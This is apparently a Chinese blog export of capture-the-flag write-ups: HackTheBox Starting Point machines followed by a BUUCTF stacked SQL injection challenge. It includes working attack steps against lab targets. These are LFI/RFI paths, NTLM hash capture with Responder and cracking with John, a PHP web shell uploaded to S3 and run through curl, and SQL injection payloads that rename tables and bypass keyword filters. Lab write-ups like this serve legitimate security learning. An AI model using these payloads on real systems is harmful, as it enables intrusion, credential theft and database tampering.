<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">rsync --list-only <span class="number">10.129.33.133</span><span class="number">::</span>public</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230129222509164.png" alt="image-20230129222509164"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">rsync <span class="number">10.129</span>.<span class="number">33.133</span><span class="symbol">:</span><span class="symbol">:public/flag</span>.txt flag.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230129223114091.png" alt="image-20230129223114091"></p>
<h4 id="什么是rsync"><a href="#什么是rsync" class="headerlink" title="什么是rsync"></a>什么是rsync</h4><blockquote>
<p>rsync是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935?fromModule=lemma_inlink">linux系统</a>下的数据镜像备份工具。使用快速增量备份工具Remote Sync可以远程同步，支持本地复制，或者与其他SSH、rsync主机同步。</p>
<p>已支持跨平台，可以在Windows与Linux间进行数据同步。</p>
</blockquote>
<h1 id="第1层"><a href="#第1层" class="headerlink" title="第1层"></a>第1层</h1><h2 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h2><h3 id="Tags-8"><a href="#Tags-8" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>数据库</code></p>
<p><code>注入</code></p>
<p><code>Apache</code></p>
<p><code>SQL</code></p>
<p><code>PHP</code></p>
<p><code>数据库</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>SQL注入</code></p>
</blockquote>
<h3 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>SQL 的缩写代表什么？：<code>Structured Query Language</code>（结构化查询语言）</li>
<li>最常见的 SQL 漏洞类型之一是什么？：<code>SQL injection</code>（SQL注入）</li>
<li>PII 代表什么？：<code>Personally Identifiable Information</code>（个人身份信息）</li>
<li>此漏洞的 2021 OWASP Top 10 分类是什么？：<code>A03:2021-Injection</code></li>
<li>HTTPS 协议使用的标准端口是什么？：<code>443</code></li>
<li>Web 应用程序术语中的文件夹是什么？：<code>directory</code></li>
<li>“未找到”错误的 HTTP 响应代码是什么？：<code>404</code></li>
<li>如果不小心处理用户输入，它可能会被解释为评论。在不知道密码的情况下使用评论以管理员身份登录。返回的网页上的第一个词是什么？：<code>Congratulations</code></li>
</ol>
</blockquote>
<h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><h3 id="Tags-9"><a href="#Tags-9" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>漏洞评估</code></p>
<p><code>数据库</code></p>
<p><code>MySQL</code></p>
<p><code>SQL</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>弱凭证</code></p>
</blockquote>
<h3 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>哪个端口为 MySQL 提供服务？：<code>3306</code></li>
<li>使用 MySQL 命令行客户端时，我们需要使用什么开关来指定登录用户名？：<code>-u</code></li>
<li>在 SQL 中，我们可以使用什么符号来在查询中指定我们要显示表中的所有内容？:<code>*</code></li>
</ol>
</blockquote>
<h2 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h2><h3 id="Tags-10"><a href="#Tags-10" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>传统应用</code></p>
<p><code>协议</code></p>
<p><code>Apache</code></p>
<p><code>FTP</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>网站结构发现</code></p>
<p><code>明文凭证</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>什么 Nmap 扫描开关在扫描期间使用默认脚本？：<code>-sC</code></li>
<li>“允许匿名 FTP 登录”消息返回给我们的 FTP 代码是什么？：<code>230</code></li>
<li>使用 ftp 客户端连接到 FTP 服务器后，当提示匿名登录时，我们提供什么用户名？：<code>anonymous</code></li>
<li>匿名连接到FTP服务器后，我们可以使用什么命令来下载我们在FTP服务器上找到的文件呢？：<code>get</code></li>
<li>我们可以使用 Gobuster 的什么开关来指定我们正在寻找特定的文件类型：<code>-x</code></li>
</ol>
</blockquote>
<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ftp</span> <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230130000838109.png" alt="image-20230130000838109"></p>
<p><img src="/2022/09/23/Hackthebox/image-20230130000857706.png" alt="image-20230130000857706"></p>
<p>扫描找到登录页面</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230130002433765.png" alt="image-20230130002433765"></p>
<p>然后抓包字典爆破得到账号密码，登录得到flag</p>
<p><img src="/2022/09/23/Hackthebox/image-20230130003936082.png" alt="image-20230130003936082"></p>
<h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="Tags-11"><a href="#Tags-11" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>WinRM</code></p>
<p><code>网络</code></p>
<p><code>传统应用</code></p>
<p><code>协议</code></p>
<p><code>XAMPP</code></p>
<p><code>SMB</code></p>
<p><code>Responder</code></p>
<p><code>PHP</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>密码破解</code></p>
<p><code>哈希捕获</code></p>
<p><code>远程文件包含</code></p>
<p><code>远程代码执行</code></p>
</blockquote>
<h3 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>用于加载网页不同语言版本的 URL 参数的名称是什么？:<code>page</code></li>
<li>page 参数的以下哪些值是利用本地文件包含 (LFI) 漏洞的示例:<code>../../../../../../../../windows/system32/drivers/etc/hosts</code></li>
<li>page 参数的以下哪些值是利用远程文件包含 (RFI) 漏洞的示例：<code>//10.10.14.6/somefile</code></li>
<li>NTLM 代表什么？:<code>New Technology LAN Manager</code></li>
<li>在 Responder 实用程序中使用哪个标志来指定网络接口？：<code>-i</code></li>
<li>有几种工具可以接受 NetNTLMv2 质询&#x2F;响应并尝试数百万个密码以查看其中是否有任何一个生成相同的响应。一种这样的工具通常被称为 <code>john</code>，但全名是什么？：<code>John the Ripper</code></li>
</ol>
</blockquote>
<h4 id="命令Responder"><a href="#命令Responder" class="headerlink" title="命令Responder"></a>命令Responder</h4><p>启动<code>responder</code>并指定<strong>监听</strong>本地的<code>tun0</code>网卡，</p>
<p>然后由于靶机存在<code>RFI</code>，因此可以远程访问本地的某个文件，使用<code>responder</code>拿到主机的<code>administrator</code>的<strong>哈希</strong>，然后使用<code>john</code>破解。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">responder -<span class="selector-tag">I</span> tun0</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230130222039665.png" alt="image-20230130222039665"></p>
<blockquote>
<p>访问<code>http://unika.htb/index.php?page=//10.10.16.28/somefile</code></p>
<p>[需要先修改<code>hosts</code>文件，把重定向ip修改到对应域名]</p>
<p>这里ip为本地tun0网卡ip</p>
</blockquote>
<p><img src="/2022/09/23/Hackthebox/image-20230130225041057.png" alt="image-20230130225041057"></p>
<p><img src="/2022/09/23/Hackthebox/image-20230130225118212.png" alt="image-20230130225118212"></p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">john -t <span class="built_in">hash</span>.txt</span><br></pre></td></tr></table></figure>

<p>得到密码</p>
<p>evil-winrm登录</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">evil-winrm -<span class="selector-tag">i</span> <span class="number">10.129</span>.<span class="number">198.112</span> -u Administrator -<span class="selector-tag">p</span> badminton</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230130232209879.png" alt="image-20230130232209879"></p>
<p><code>flag</code>在<code>mike</code>用户的<code>Desktop</code>目录中</p>
<h4 id="什么是smb？"><a href="#什么是smb？" class="headerlink" title="什么是smb？"></a>什么是smb？</h4><blockquote>
<p><em>SMB</em>(全称是Server Message Block)是一个网络协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。</p>
</blockquote>
<h4 id="什么是WinRM？"><a href="#什么是WinRM？" class="headerlink" title="什么是WinRM？"></a>什么是WinRM？</h4><blockquote>
<p><strong>WinRM</strong>（<strong>Windows 远程管理</strong>，<strong>Windows Remote Management</strong>）是<a href="https://zh.m.wikipedia.org/wiki/WEB%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86">WEB服务管理</a>于<a href="https://zh.m.wikipedia.org/wiki/%E5%BE%AE%E8%BD%AF">微软</a>的<a href="https://zh.m.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>中的<a href="https://zh.m.wikipedia.org/wiki/%E5%AF%A6%E7%8F%BE">实现</a>，它允许处于一个共同<a href="https://zh.m.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1">网络</a>内的<a href="https://zh.m.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>计算机彼此之间互相访问和交换信息。在一台机器启用WinRM后，另一台机器就能通过<a href="https://zh.m.wikipedia.org/wiki/Windows_PowerShell">Windows PowerShell</a>对开启WinRM的机器进行<a href="https://zh.m.wikipedia.org/wiki/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86">远程管理</a></p>
</blockquote>
<h4 id="什么是NTLM？"><a href="#什么是NTLM？" class="headerlink" title="什么是NTLM？"></a>什么是NTLM？</h4><blockquote>
<p>NTLM是Windows 新技术 LAN 管理器(NTLM) 是 Microsoft 提供的一套安全协议，用于验证用户身份并保护其活动的完整性和机密性。</p>
<p>指telnet 的一种<code>验证身份方式</code>，即问询&#x2F;应答身份验证协议，是Windows NT 早期版本的标准安全协议，Windows 2000 支持NTLM 是为了保持向后兼容。 Windows 2000内置三种基本安全协议之一。</p>
</blockquote>
<h4 id="什么是Responder？"><a href="#什么是Responder？" class="headerlink" title="什么是Responder？"></a>什么是Responder？</h4><blockquote>
<p>Responder就是这样一种<code>利用身份认证协议，监听获取口令哈希</code>的工具。 如果<strong>客户端&#x2F;目标无法通过DNS域名解析，则会回退到LLMNR（在Windows Vista中引入）和NBT-NS进行解析</strong>。 <code>LLMNR</code>（链路本地多播名称解析）：多播方式查找网络上的主机，其它主机响应IP，然后连接。</p>
</blockquote>
<h4 id="什么是evil-winrm？"><a href="#什么是evil-winrm？" class="headerlink" title="什么是evil-winrm？"></a>什么是evil-winrm？</h4><blockquote>
<p>evil-winrm是<code>Windows</code>远程管理(WinRM) Shell的终极版本。 Windows远程管理是“WS 管理协议的Microsoft 实施，该协议是基于标准SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。</p>
</blockquote>
<h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><h3 id="Tags-12"><a href="#Tags-12" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>Cloud</code></p>
<p><code>传统应用</code></p>
<p><code>AWS</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>网站结构发现</code></p>
<p><code>桶枚举</code></p>
<p><code>任意文件上传</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>哪个命令行实用程序可用于与在已发现的子域上运行的服务进行交互？：<code>awscli</code></li>
<li>哪个命令用于设置 AWS CLI 安装？：<code>aws configure</code></li>
<li>上述实用程序用于列出所有 S3 存储桶的命令是什么？：<code>aws s3 ls</code></li>
</ol>
</blockquote>
<h4 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h4><p><code>gobuster</code>爆破子域名</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster vhost -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>subdomains-top1million-<span class="number">5000</span>.txt -u http:<span class="regexp">//</span>thetoppers.htb</span><br></pre></td></tr></table></figure>

<p>列出该<code>s3存储桶</code>下的内容</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">aws s3 <span class="keyword">ls</span> <span class="params">--endpoint=http</span>:<span class="string">//s3.thetoppers.htb/</span> s3:<span class="string">//thetoppers.htb</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230131004300879.png" alt="image-20230131004300879"></p>
<p>本地写一个<code>一句话木马脚本</code></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php </span></span><br></pre></td></tr></table></figure>

<p>上传本地一句话木马到s3存储桶</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">aws</span> <span class="built_in">s3</span> <span class="meta">cp</span> shell.php --endpoint<span class="symbol">=http</span>:<span class="comment">//s3.thetoppers.htb/ s3://thetoppers.htb </span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230131004712717.png" alt="image-20230131004712717"></p>
<p>访问看看是否成功</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>thetoppers.htb/shell.php?cmd=ls</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230131004810309.png" alt="image-20230131004810309"></p>
<p>然后蚁剑连接也行，但htb的vpn不走主机连不上</p>
<p>所以可以利用nc反弹shell，也可以直接利用脚本在进行命令执行读取flag</p>
<p><img src="/2022/09/23/Hackthebox/image-20230131005440119.png" alt="image-20230131005440119"></p>
<h4 id="什么是aws？"><a href="#什么是aws？" class="headerlink" title="什么是aws？"></a>什么是aws？</h4><blockquote>
<p>亚马逊<code>AWS（Amazon Web Services (AWS) ）</code>是亚马逊提供的<code>是全球最全面、应用最广泛的云平台</code>，从全球数据中心提供超过 200 项功能齐全的服务。数百万客户(包括增<code>长最快速的初创公司、最大型企业和主要的政府机构)都在使用 AWS</code> 来降低成本、提高敏捷性并加速创新。</p>
</blockquote>
<h4 id="什么是awscli？"><a href="#什么是awscli？" class="headerlink" title="什么是awscli？"></a>什么是awscli？</h4><blockquote>
<p><code>AWS 命令行界面（AWS CLI）</code>是用于管理AWS 产品的统一工具。 只需要下载和配置一个工具，您就可以使用命令行控制多个AWS 产品并<code>利用脚本</code>来自动执行这些服务</p>
</blockquote>
<h4 id="什么是-Amazon-S3？"><a href="#什么是-Amazon-S3？" class="headerlink" title="什么是 Amazon S3？"></a>什么是 Amazon S3？</h4><blockquote>
<p>Amazon Simple Storage Service（Amazon S3）是一种<code>对象存储服务</code>，提供行业领先的可扩展性、数据可用性、安全性和性能。各种规模和行业的客户都可以使用 Amazon S3 存储和保护任意数量的数据，<code>用于数据湖、网站、移动应用程序、备份和恢复、归档、企业应用程序、IoT 设备和大数据分析</code>。Amazon S3 提供了管理功能，使您可以优化、组织和配置对数据的访问，以满足您的特定业务、组织和合规性要求。</p>
</blockquote>
<h4 id="什么是Bucket-Enumeration-存储桶枚举-？"><a href="#什么是Bucket-Enumeration-存储桶枚举-？" class="headerlink" title="什么是Bucket Enumeration(存储桶枚举)？"></a>什么是Bucket Enumeration(存储桶枚举)？</h4><blockquote>
<p><code>S3 存储桶枚举</code>是查询 S3 存储桶和这些存储桶中的对象的过程。这可以使用不同的 AWS API 调用来完成，例如列出存储桶、获取存储桶内容或 ListObjects。此过程旨在确定给定存储桶中存在哪些 S3 对象。您可以使用此信息来帮助您更好地了解您的数据资源，并就如何最好地管理它做出决定。</p>
</blockquote>
<h1 id="第2层"><a href="#第2层" class="headerlink" title="第2层"></a>第2层</h1>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>线上靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf靶场wp</title>
    <url>/2022/06/21/buuctf-wp/</url>
    <content><![CDATA[<p><code>web各个方面选择了一些题目进行学习，感觉还是得第一次就应该看通彻，不应该留有问题，能够明白原理和代码中哪出造成这个的原因，反复嚼剩饭感觉浪费时间</code></p>
<span id="more"></span>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-强网杯-2019-随便注"><a href="#1-强网杯-2019-随便注" class="headerlink" title="1.[强网杯 2019]随便注"></a>1.[强网杯 2019]随便注</h2><h3 id="1）题目描述"><a href="#1）题目描述" class="headerlink" title="1）题目描述"></a>1）题目描述</h3><p>无</p>
<h3 id="2）wp"><a href="#2）wp" class="headerlink" title="2）wp"></a>2）wp</h3><p>因为之前没有了解过堆叠注入，这里挨个分析学习</p>
<p>先来确定sql注入</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220701113045499.png" alt="image-20220701113045499"></p>
<p>然后试试显示所有数据，感觉看不到什么意思，后面一步步分析</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>;#</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220702105520465.png" alt="image-20220702105520465"></p>
<p>然后判断字段</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113210998.png" alt="image-20220701113210998"></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113228972.png" alt="image-20220701113228972"></p>
<p>判断处字段数为2</p>
<p>然后用<strong>联合注入</strong></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113604165.png" alt="image-20220701113604165"></p>
<p>发现select被正则匹配过滤了，用大小写绕过也不行，所以只能换一种方法</p>
<p>可以先了解<a href="../../../../2022/05/28/Web-study">堆叠注入</a>的概念和注入方式</p>
<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a><strong>堆叠注入</strong></h4><p>先查看所有的数据库</p>
<p><code>注：这里仍然要查询数据为假，比如-1，不然就不会执行后面的sql语句</code></p>
<p><code>;间隔sql语句</code></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220701224154901.png" alt="image-20220701224154901"></p>
<p>根据题目名字，先调用supersqli这个库的表看看</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220701222551203.png" alt="image-20220701222551203"></p>
<p>看到有两个表，先看一下纯数字的表里的内容</p>
<p> <strong><u>注：当纯数字字符串是表名的时候需要加反引号&#96;</u></strong></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> columns from`<span class="number">1919810931114514</span>`;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220701224603433.png" alt="image-20220701224603433"></p>
<p>看到flag在里面，再看看words里</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;use supersqli;show columns <span class="keyword">from</span> <span class="built_in">words</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220701233450179.png" alt="image-20220701233450179"></p>
<p><code>VARCHAR(M)是一种比CHAR更加灵活的数据类型，同样用于表示字符数据，但是VARCHAR可以保存可变长度的字符串</code></p>
<p>这里猜测，因为flag是字符串，所以猜测输入框查询的就是words表</p>
<p>后台sql语句可能（xx为输入框的内容）</p>
<p><code>select id,data from words where id=xx</code></p>
<hr>
<p>更改表名列名</p>
<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，给新 words 表添加新的列名 id 。</p>
<p>4，将 flag 改名为 data 。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;rename table `<span class="built_in">words</span>` <span class="keyword">to</span> words2;rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">100</span>);show tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702220112706.png" alt="image-20220702220112706"></p>
<p>可以看到表<code>1919810931114514</code>名字被改成了可查询表<code>words</code></p>
<p>再看看words表的列，flag变成了id，NO变成了YES</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702220308651.png" alt="image-20220702220308651"></p>
<p>用<code>1&#39; and 1=1#</code></p>
<p>看看回显数据</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702221617795.png" alt="image-20220702221617795"></p>
<p>得到flag</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQl</span>的<span class="keyword">rename</span></span><br><span class="line">用于重命名表名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>的<span class="keyword">alter</span>用法总结</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>：删除列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> 列名</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>：增加列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> 列名 属性 【约束】</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>：修改列的类型信息</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE <span class="keyword">COLUMN</span> 列名 【新】列名</span><br><span class="line">新属性</span><br><span class="line"><span class="number">4</span>：重命名列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名字 CHANGE <span class="keyword">COLUMN</span> 列名 新列名 属性</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>：重命名表</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">RENAME</span> <span class="keyword">TO</span> 表新名</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>：删除表中主键</span><br><span class="line"></span><br><span class="line"><span class="keyword">Alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">primary key</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>：添加主键</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 约束名 <span class="keyword">PRIMARY KEY</span> (添加列)</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>：添加索引</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">index</span> 索引名 (列名);</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>：修改列的属性</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 MODIFY <span class="keyword">COLUMN</span> 要修改属性的列名 新属性;</span><br><span class="line"></span><br><span class="line">一般情况下，不推荐在建表后对表进行大幅度修改，大幅度修改极有可能使表数据丢失。</span><br></pre></td></tr></table></figure>

<p>–</p>
<p>看了其他大佬的wp，这里补充两种方法</p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/103239145">原文链接</a></p>
<h4 id="解题思路2：预处理绕过select限制"><a href="#解题思路2：预处理绕过select限制" class="headerlink" title="解题思路2：预处理绕过select限制"></a><strong>解题思路2：<a href="https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">预处理</a>绕过select限制</strong></h4><p>因为select被过滤了，所以先将</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">` 1919810931114514 `</span></span><br></pre></td></tr></table></figure>

<p>进行16进制编码</p>
<p>再通过构造payload得</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure>

<p>进而得到flag</p>
<pre><code>prepare…from…是预处理语句，会进行编码转换。
execute用来执行由SQLPrepare创建的SQL语句。
SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200125185407747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="解题思路3：handler绕过"><a href="#解题思路3：handler绕过" class="headerlink" title="解题思路3：handler绕过"></a><strong>解题思路3：<a href="https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020">handler</a>绕过</strong></h4><p>payload：</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler <span class="string">`1919810931114514`</span> open as <span class="string">`a`</span>; handler <span class="string">`a`</span> read next;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200225203706719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="handler基本用法"><a href="#handler基本用法" class="headerlink" title="handler基本用法"></a>handler基本用法</h5><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; FIRST | <span class="keyword">NEXT</span> | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> &#123; FIRST | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> FIRST获取句柄的第一行，通过<span class="keyword">READ</span> <span class="keyword">NEXT</span>依次获取其它行。最后一行执行之后再执行<span class="keyword">NEXT</span>会返回一个空的结果。</span><br><span class="line">通过HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br><span class="line"></span><br><span class="line">通过索引去查看的话可以按照一定的顺序，获取表中的数据。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> index_name FIRST，获取句柄第一行（索引最小的一行），<span class="keyword">NEXT</span>获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</span><br><span class="line"></span><br><span class="line">通过索引列指定一个值，可以指定从哪一行开始。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> index_name = value，指定从哪一行开始，通过<span class="keyword">NEXT</span>继续浏览。</span><br></pre></td></tr></table></figure>



<p><u><code>句柄：【相当于一个指针，这里是指向数据库里的表】</code></u></p>
